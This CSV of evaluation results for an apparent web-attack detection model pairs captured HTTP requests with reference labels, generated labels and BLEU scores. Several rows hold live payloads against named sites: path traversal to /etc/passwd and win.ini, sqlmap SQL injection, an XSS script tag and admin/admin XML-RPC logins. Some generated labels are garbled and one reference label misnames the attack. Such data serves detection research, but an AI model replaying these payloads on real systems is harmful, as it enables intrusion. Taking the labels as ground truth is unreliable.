payload,reference_text,candidate_text,bleu_score
"GET / media / mediaView. do? c _ ctgry _ id = & c _ se _ id = & collection _ se = CS03 & ctgry _ dep = 1 & ctgry _ id = 598419 & digital = & digital _ all = & itm _ id = 597828 & page = 1 & real =.. /... /.. /. /.. /... /.. /. /.. /... /.. /. /.. /... /.. /. /.. /... /.. /. /.. /... /.. /. / windows / win. ini & real _ all = & rowNum = 12 & s _ ctgry _ id = & ss _ ctgry _ id = HTTP / 1. 1 \ nReferer : http : / / archive. acc. go. kr / \ nCookie : JSESSIONID = hyx0Js8BbEoMzhRawtXT1rjTjZH5cBV0XwzIoqrnKi5RdUvUJqbXQLt3QWMmX1Oy. amV1c19kb21haW4vYXJjaGl2ZV9zZXJ2ZXI = \ nAccept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, * / * ; q = 0. 8 \ nUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 73. 0. 3683. 103 Safari / 537. 36 \ nX - Akamai - CONFIG - LOG - DETAIL : true \ nTE : chunked ; q = 1. 0 \ nConnection : TE \ nAccept - Encoding : gzip \ nAkamai - Origin - Hop : 1 \ nVia : 1. 1 akamai. net ( ghost ) ( AkamaiGHost ) \ nX - Forwarded - For : 155. 159. 255. 233 \ nTrue - Client - IP : 155. 159. 255. 233 \ nHost : archive. acc. go. kr \ nPragma : no - cache \ nCache - Control : no - cache, max - age = 0 \ nConnection : keep - alive",Label : 1 Attack Syntax :.. /.. /.. /... /.. /... /.. /... /.. /... /.. /... /.. /... /.. /... /.. / windows / win. ini Attack Type : Path Traversal,Label : 1 Attack Syntax : . . / . . / . . / . . / . . . . . . . . / . . / . / . . . . . . / . . . . . . / . . / / . . . . . . / / / .,0.06364272686646505
"< a href = "" / mypage / mypage. do "" > < / a > < ul class = "" depth02 "" > < li > < a href = "" / mypage / information. do "" > < / a > < / li > < / ul > < ul class = "" depth02 "" > < li > < a href = "" / mypage / document. do "" > < / a > < / li > < / ul > < ul class = "" depth02 "" > < li > < a href = "" / mypage / event. do "" > < / a > < / li > < / ul > < / li > < li > < a href = "" / english. do "" > English < / a > < / li > < li > < a href = "" / cultureplan / cardList. do "" class = "" chk011 "" > < / a > < / li > < li > < / li > < / ul > < / li > < / ul > < a href = "" / culture / publicize. do "" class = "" banner _ link "" > < img src = "" / assets / images / common _ new / img _ culture _ guide. png "" alt = "" "" / > < / a > < a href = "" http : / / culture - chatbot. kcisa. kr "" class = "" btn _ chatbot "" onclick = "" openPopup ( this. href, 500, 650 ) ; return false ; "" > < img src = "" / assets / images / common _ new / btn _ chatbot. png "" alt = "" "" / > < / a > <! - - < a href = "" http : / / kcisa. kro. kr / iChat "" target = "" _ blank "" class = "" btn _ chatbot "" onclick = "" openPopup ( this. href, 5",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / eng / pr / movAjaxList. do? mbMovCd = 01 & pageIndex =.. /... /.. /. /.. /... /.. /. /.. /... /.. /. /.. /... /.. /. /.. /... /.. /. /.. /... /.. /. / windows / win. ini & searchCcdId = & searchGCcdId = & searchType = 03 HTTP / 1. 1 \ r \ nReferer : http : / / www. mmca. go. kr / \ r \ nCookie : JSESSIONID = 6oaryRcz9daWK6xfosxLF1r8xsSm03aTX0Ku4WVFlIU91uWFJbZGd0OoXbAUSmTo. mocaweb _ servlet _ engine7 ; CID = null \ r \ nAccept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, * / * ; q = 0. 8 \ r \ nAccept - Encoding : gzip, deflate \ r \ nHost : www. mmca. go. kr \ r \ nUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 73. 0. 3683. 103 Safari / 537. 36 \ r \ nConnection : Keep - alive",Label : 1 Attack Syntax :.. /.. /.. /.. /.. /.. /.. /.. / windows / win. ini Attack Type : Path Traversal,Label : 1 Attack Syntax : . . . . . . . . / / . / . . . . . . . . / . . . . . . . . . . . . . . . . . . / . . / . . . . . . / . / . . . . / / / / / /,0.0559841456840758
"GET / InsightTrk / tracker. do? pfno = 1157 & uuid = 143068137f86912d2f52db91d0400cf4 _ 78951 & sid = 87d014101f8d814d72e3311371dd22f9 _ 75602 & guuid = 143068137f86912d2f52db91d0400cf4 _ 78951 & expired = 1618077402 & dr = & XDR = & dt = Korean Culture and Information Service & du = http : / / www. kocis. go. kr / eng / openInformation. do & js = Y & sr = 1366x768 & scd = 24 & je = N & tz = 8 & tye = 2021 & tmo = 4 & tda = 11 & tho = 1 & tmi = 26 & tse = 42 & lng = en - US & os = Win32 & cpu = & vr = 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 89. 0. 4389. 114 Safari / 537. 36 & ck = Y & brsz = 672x647 & isnw = Y HTTP / 1. 1 \ r \ nHost : logger. kcisa. kr \ r \ nConnection : keep - alive \ r \ nUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 89. 0. 4389. 114 Safari / 537. 36 \ r \ nAccept : image / avif, image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8 \ r \ nReferer : http : / / www. kocis. go. kr / \ r \ nAccept - Encoding : gzip, deflate \ r \ nAccept - Language : en - US, en ; q = 0. 9",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / api / header / items HTTP / 1. 1 Host : www. voakorea. com Connection : keep - alive sec - ch - ua : "" Not. A / Brand "" ; v = "" 8 "", "" Chromium "" ; v = "" 114 "", "" Google Chrome "" ; v = "" 114 "" X - Requested - With : XMLHttpRequest sec - ch - ua - mobile :? 0 User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 114. 0. 0. 0 Safari / 537. 36 sec - ch - ua - platform : "" Windows "" Accept : * / * Sec - Fetch - Site : same - origin Sec - Fetch - Mode : cors Sec - Fetch - Dest : empty Referer : https : / / www. voakorea. com / a / 7129142. html Accept - Encoding : gzip, deflate, br Accept - Language : ko - KR, ko ; q = 0. 9, en - US ; q = 0. 8, en ; q = 0. 7 Cookie : _ vwo _ uuid _ v2 = D4C6890181A8A8B4695BF874EF7E39A4E | 549ac7e87b372b06f62dd57b9f7dfa53 ; _ cb = B4j7t9B2HHEpCCKlIT ; _ fbp = fb. 1. 1678691761652. 227065208 ; _ ga = GA1. 2. 1004971206. 1678691761 ; _ _ qca = P0 - 2099144829 - 1678691761835 ; PangeaEnvironment = 2 ; Pangea - NodeId = FD + / fq + LRvrdkCjNN70AsQ = = ; _ v _ _ chartbeat3 = CU6KK _ B8sOS1MzbXz ;. ASPXANONYMOUS = FSOQgL9FRTth4go5hQ2VW _ trm6fgXa57HnGoGZeCaQT7xgv9EnfLe0CwF4VYclG _ KM4AeKu3rPfpKUdfjLrtfa636UG3fzMohR3 - 0DQqtn56FQGJ6",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1') / * * / AND / * * / 6691 = 1885 / * * / AND / * * / ('tWas'='tWas sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) PHPSESSID = jlpd56fppfes3q8njmedlrscgq ; security = impossible,",Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1') / * * / AND / * * / 6691 = 1885 / * * / AND / * * / ('tWas'='tWas Attack Type : SQL Injection,Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions . php / dvwa / instructions . php ? doc = 1 ' ) / * * / AND / * * / 8678 = ' / * * / AND / * * / ( ' ' ' = ' Attack Attack Type : SQL Injection,0.6007410214886972
"http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1 "" / * * / RLIKE / * * / ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 7765 = 2721 ) / * * / THEN / * * / 1 / * * / ELSE / * * / 0x28 / * * / END ) ) / * * / AND / * * / "" sOff "" / * * / LIKE / * * / "" sOff sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) PHPSESSID = jlpd56fppfes3q8njmedlrscgq ; security = impossible,","Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1 "" / * * / RLIKE / * * / ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 7765 = 2721 ) / * * / THEN / * * / 1 / * * / ELSE / * * / 0x28 / * * / END ) ) / * * / AND / * * / "" sOff "" / * * / LIKE / * * / "" sOff Attack Type : SQL Injection","Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions . php / dvwa / instructions . php ? doc = 1 "" / * * / RLIKE / * * / ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 3998 = 3998 ) / * * / THEN / * * / 1 / * * / ELSE / * * / 0x28 / * * / END ) ) / * * / AND / * * / "" "" "" / * * / LIKE / * * / "" "" Attack Type : SQL Injection",0.8439403273913219
"GET / 4829 _ 1667361470. png HTTP / 1. 1 Host : img. stibee. com Connection : keep - alive sec - ch - ua : "" Not. A / Brand "" ; v = "" 8 "", "" Chromium "" ; v = "" 114 "", "" Microsoft Edge "" ; v = "" 114 "" sec - ch - ua - mobile :? 0 User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 114. 0. 0. 0 Safari / 537. 36 Edg / 114. 0. 1823. 43 sec - ch - ua - platform : "" Windows "" Accept : image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8 Sec - Fetch - Site : cross - site Sec - Fetch - Mode : no - cors Sec - Fetch - Dest : image Referer : http : / / www. koreapeace. or. kr / Accept - Encoding : gzip, deflate, br Accept - Language : ko, en ; q = 0. 9, en - US ; q = 0. 8",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"POST / member / onlineIssue / displayOnlineIssueStep 2. do / xmlrpc. php HTTP / 1. 1 Host : www. alime. or. kr User - Agent : Mozilla / 5. 0 ( Windows NT 1 0. 0 ; Win 6 4 ; x 6 4 ) AppleWebKit / 5 3 7. 3 6 ( KHTML COMMA like Gecko ) Chrome / 8 1. 0. 4 0 4 4. 1 3 8 Safari / 5 3 7. 3 6 Content - Length : 1 9 2 Accept : * / * Content - Type : application / xml ; charset = utf - 8 Connection : close <? xml version = "" 1. 0 "" encoding = "" UTF - 8 ""? > < methodCall > < methodName > wp. getUsersBlogs < / methodName > < params > < param > < value > admin < / value > < / param > < param > < value > admin < / value > < / param > < / params > < / methodCall >",Label : 1 Attack Syntax : < methodCall > < methodName > wp. getUsersBlogs < / methodName > < params > < param > < value > admin < / value > < / param > < param > < value > admin < / value > < / param > < / params > < / methodCall > Attack Type : XML External Entity ( XXE ) Injection,Label : 1 Attack Syntax : wp . getUsersBlogs Attack Type Type XML External RPC Entity,0.014196915724782988
"/ deploydata / list / allDomains? stime = 1686297783265 & etime = 1686298383265 & format = json & searchData = { "" 10000 "" : [ 109 ] } HTTP / 1. 1 Host : 10. 63. 21. 70 : 7900 Connection : keep - alive Accept : application / json ; charset = utf - 8 User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 110. 0. 0. 0 Safari / 537. 36 Referer : http : / / 10. 63. 21. 70 : 7900 / dashboard / realtimeAdmin Accept - Encoding : gzip, deflate Accept - Language : ko - KR, ko ; q = 0. 9, en - US ; q = 0. 8, en ; q = 0. 7 Cookie : JSESSIONID7900 = node03qzaeqwpifxixujedzkxtd28270. node0",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / imageProxy. do? svc = 2D & param = / geoserver / seoul / wfs? service = WFS & version = 1. 0. 0 & request = GetFeature & outputFormat = application / json & typeName = seoul : poi _ base & CQL _ FILTER = level < = 10 and bbox ( geom, 195132, 554072, 195196, 554136 ) HTTP / 1. 1 \ r \ nHost : smap. seoul. go. kr \ r \ nConnection : keep - alive \ r \ nUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 89. 0. 4389. 114 Safari / 537. 36 \ r \ nAccept : * / * \ r \ nReferer : http : / / smap. seoul. go. kr / \ r \ nAccept - Encoding : gzip, deflate \ r \ nAccept - Language : ko - KR, ko ; q = 0. 9, en - US ; q = 0. 8, en ; q = 0. 7 \ r \ nCookie : _ ga = GA1. 3. 1388692350. 1599706919 ; WL _ PCID = 15997069189891159054347 ; _ gid = GA1. 3. 1267222758. 1617707223 ; isVisited = true ; JSESSIONID = E72C09BC53BB265E80D81400AE4CF677",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"altinio failas < / comment > < comment xml : lang = "" lv "" > BitTorrent do. anas fails < / comment > < comment xml : lang = "" ms "" > Fail seed BitTorrent < / comment > < comment xml : lang = "" nb "" > Fil med utgangsverdi for BitTorrent < / comment > < comment xml : lang = "" nl "" > BitTorrent - bestand < / comment > < comment xml : lang = "" nn "" > Nedlastingsfil for BitTorrent < / comment > < comment xml : lang = "" pl "" > Plik ziarna BitTorrent < / comment > < comment xml : lang = "" pt "" > ficheiro de origem BitTorrent < / comment > < comment xml : lang = "" pt _ BR "" > Arquivo semente BitTorrent < / comment > < comment xml : lang = "" ru "" >............. BitTorrent < / comment > < comment xml : lang = "" sq "" > File baz. BitTorrent < / comment > < comment xml : lang = "" sr "" >.................................. < / comment > < comment xml : lang = "" sv "" > BitTorrent - distributionsfil < / comment > < comment xml : lang = "" uk "" >....................... BitTorrent < / comment > < comment xml : lang = "" vi "" > T. i t. p h. t BitTorrent < / comment > < comment xml : lang = "" zh _ CN "" > BitTorrent? < / comment > < comment xml : lang = "" zh _ TW "" > BitTorrent? < / comment > < magic priority = "" 50 "" > < match value = "" d8 : announce "" type = "" string "" offset = "" 0 "" / > < / magic > < glob pattern = "" *. torrent "" / > < / mime - type > < mime - type type = "" application / x - blender "" > < comment > Blender scene < / comment > < comment xml : lang = "" be @ latin "" > Scena Blender < / comment > <",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / _ Lib _ Proxy _ Url / http : / resolver. ebscohost. com / openurl? & sid = naver & atitle = Frontispiece : Traceless Removal of Two Kernel Atoms in a Gold Nanocluster and Its Impact on Photoluminescence & title = Angewandte Chemie International Edition & volume = 60 & issue = 16 & date = 2021 & issn = 1433 - 7851 HTTP / 1. 1 \ r \ nUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 57. 0. 2987. 133 Safari / 537. 36 \ r \ nAccept - Encoding : deflate, gzip, x - gzip \ r \ nHost : libproxy. karts. ac. kr \ r \ nConnection : keep - alive",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / mcop / pims / view. do? intcNo = 118F403006 & amp ; recptSt = "" AND 5409 = 5409 AND "" aJHX "" LIKE "" aJHX HTTP / 1. 1 \ nCache - Control : no - cache \ nUser - Agent : Opera / 9. 02 ( Windows NT 5. 0 ; U ; sv ) \ nReferer : http : / / m. home. kocca. kr : 80 / mcop / pims / view. do \ nHost : m. home. kocca. kr \ nCookie : KCSESSIONID = 5Ls2gl1V5TCQW0pM2Q1fmQXbRfGzLFp3QQv63D381pq0pxN9BKG7! - 337396942! 791589242 \ nAccept : * / * \ nAccept - Encoding : gzip, deflate \ nConnection : close","Label : 1 Attack Syntax : & amp ; recptSt = "" AND 5409 = 5409 AND "" aJHX "" LIKE "" aJHX Attack Type : SQL Injection","Label : 1 Attack Syntax : intcNo = 118F403006 118F403006 recptSt = "" AND AND AND AND AND "" "" "" "" "" "" Type Type SQL SQL Injection",0.2950513807609976
"GET / InsightTrk / tracker. do? pfno = 1157 & uuid = cec16613718eb09863c8695bf2c1c67b _ 86139 & sid = 285e7b1e5faf2203685a695bf2c1c67b _ 86139 & guuid = cec16613718eb09863c8695bf2c1c67b _ 86139 & expired = 1618688232 & dr = http : / / www. kocis. go. kr / eng / openCulturalNews. do? langCode = lang002 & regCode = & cateCode = & searchText = & searchType = & startDate = & endDate = & page = 8 & XDR = & dt = Korean Culture and Information Service & du = http : / / www. kocis. go. kr / eng / openCulturalNews. do? langCode = lang002 & regCode = & cateCode = & searchText = & searchType = & startDate = & endDate = & page = 9 & js = Y & sr = 732x412 & scd = 24 & je = N & tz = 2 & tye = 2021 & tmo = 4 & tda = 17 & tho = 21 & tmi = 7 & tse = 12 & lng = en - ZA & os = Linux armv8l & cpu = & vr = 5. 0 ( Linux ; Android 10 ; SM - J400F ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 89. 0. 4389. 105 Mobile Safari / 537. 36 & ck = Y & brsz = 732x284 & isnw = N HTTP / 1. 1 \ r \ nHost : logger. kcisa. kr \ r \ nConnection : keep - alive \ r \ nUser - Agent : Mozilla / 5. 0 ( Linux ; Android 10 ; SM - J400F ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 89. 0. 4389. 105 Mobile Safari / 537. 36 \ r \ nAccept : image / avif, image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8 \ r \ nReferer : http : / / www. kocis. go. kr / \ r \ nAccept - Encoding : gzip, deflate \ r \ nAccept - Language : en -",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
1cbdda364de3b1fd. 1785de8bf5c @ unimail. or. kr > ] [ state : remote - delivery ] INFO 2021 / 03 / 23 16 : 07 : 21 [ Mail1616483238091 - 7754 - sep - 0 - via - [ 125. 128. 67. 29 : 25 ] ] - SpoolManager > attempting > [ mimeMessageId : < Mime4j. 4bc8. 1cbdda364de3b1fd. 1785de8bf5c @ unimail. or. kr > ] [ from : world5859 @ unimail. or. kr ] [ to : beststarmin @ naver. com ] [ hostname : 125. 128. 67. 29 ] [ ip : 125. 128. 67. 29 ] INFO 2021 / 03 / 23 16 : 07 : 22 [ Mail1616483238091 - 7754 - sep - 0 - via - [ 125. 128. 67. 29 : 25 ] ] - SpoolManager > sent > [ mimeMessageId : < Mime4j. 4bc8. 1cbdda364de3b1fd. 1785de8bf5c @ unimail. or. kr > ] [ from : world5859 @ unimail. or. kr ] [ to : beststarmin @ naver. com ] [ hostname : 125. 128. 67. 29 ] [ ip : 125. 128. 67. 29 ] INFO 2021 / 03 / 23 16 : 07 : 22 [ Mail1616483238091 - 7754 - sep - 0 - via - [ 125. 128. 67. 29 : 25 ] ] - SpoolManager > removed from spool > [ mimeMessageId : < Mime4j. 4bc8. 1cbdda364de3b1fd. 1785de8bf5c @ unimail. or. kr > ] [ state : remote - delivery ] INFO 2021 / 03 / 23 16 : 29 : 13 [ Mail1616484550345 - 7765 - sep - 0 - via - [ 125. 128. 67. 29 : 25 ] ] - SpoolManager > Begin processing > [ mimeMessageId : < Mime4j. 4bd9. 3592c11055e36,Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / collections / AjaxHCollectionsList. do? langCd = 3 & menuId = & pageIndex = & searchChNm = & searchCollectDt = /.. \.. \ WEB - INF \ web. xml & searchEnNm = & searchFieldGb = & searchHGubun = Y & searchProd = & searchText = & searchWebGubun = Y HTTP / 1. 1 \ r \ nReferer : http : / / www. mmca. go. kr / \ r \ nCookie : JSESSIONID = 6oaryRcz9daWK6xfosxLF1r8xsSm03aTX0Ku4WVFlIU91uWFJbZGd0OoXbAUSmTo. mocaweb _ servlet _ engine7 ; CID = null \ r \ nAccept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, * / * ; q = 0. 8 \ r \ nAccept - Encoding : gzip, deflate \ r \ nHost : www. mmca. go. kr \ r \ nUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 73. 0. 3683. 103 Safari / 537. 36 \ r \ nConnection : Keep - alive",Label : 1 Attack Syntax : /.. \.. \ WEB - INF \ web. xml Attack Type : Path Traversal,Label : 1 Attack Syntax : . . . . . \ WEB - INF INF web . xml xml Attack : Path Traversal Traversal,0.351224701507158
"GET / ccmivr / IVRGetAudioFile. do? file =.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. / etc / passwd HTTP / 1. 1Host : kaos. kopri. re. krUser - Agent : Mozilla / 5. 0 ( Macintosh ; Intel Mac OS X 10 _ 10 _ 1 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 41. 0. 2227. 1 Safari / 537. 36Connection : closeAccept : * / * Accept - Language : enAccept - Encoding : gzip",Label : 1 Attack Syntax :.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. / etc / passwd Attack Type : Path Traversal,Label : 1 Attack Syntax : . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / / / / / / / Type Type Path,0.0795350275727662
"/ dvwa / index. php? action = list & order = name "" / > < script > alert ( 338 ) ; < / script > & srt = yes Mozilla / 5. 0 ( Windows NT 6. 1 ; WOW64 ; Trident / 7. 0 ; rv : 11. 0 ) like Gecko,","Label : 1 Attack Syntax : / dvwa / index. php? action = list & order = name "" > / < script > alert ( 338 ) ; < / script > & srt = yes Attack Type : Cross - Site Scripting ( XSS )","Label : 1 Attack Syntax : / dvwa / upload . php > > = = > ? ? < / "" > < > script alert alert ( ) ) < script script script > / script > Attack Type : Cross - Site Scripting ( XSS )",0.43181459137021405
"GET / oceangrid / cmm / proxyRun. do? call = wms & LAYERS = geotwo _ postgis : og _ rcm _ gm _ mdc _ view & CQL _ FILTER = cre _ year > = 2019 AND cre _ year < = 2019 AND date _ type < >'hours'& SERVICE = WMS & REQUEST = GetMap & FORMAT = image / png & VERSION = 1. 3. 0 & EXCEPTIONS = text / xml & TRANSPARENT = TRUE & STYLES = & CRS = EPSG : 900913 & BBOX = 14344433. 822121, 4178700. 2569459, 14491192. 916409, 4245964. 8418275 & WIDTH = 1920 & HEIGHT = 880 HTTP / 1. 1Host : www. khoa. go. krConnection : keep - aliveUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 104. 0. 0. 0 Safari / 537. 36Accept : image / avif, image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8Referer : http : / / www. khoa. go. kr / oceangrid / gis / category / observe / observeSearch. do? type = EYSAccept - Encoding : gzip, deflateAccept - Language : ko, en ; q = 0. 9Cookie : JSESSIONID = kvfUmzRxR5dqH75HnR46zFWdFNT9EewwskIz33FqpoGdAq3dbYorlQgBNoWF8UWC. UEtIT0Evb2NlYW5ncmlkMjE = ; WMONID = gW5jaydx6VB ; PCID = aa5eee43 - d096 - f879 - f507 - 83cf4f7a95c1 - 1660634029890 ; SCOUTER = z7hndgvghk4tc7 ; khoaNoticePop146 = true ; openApiKeyExpirePopup999999 = true ; khoaNoticePop144 = true",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
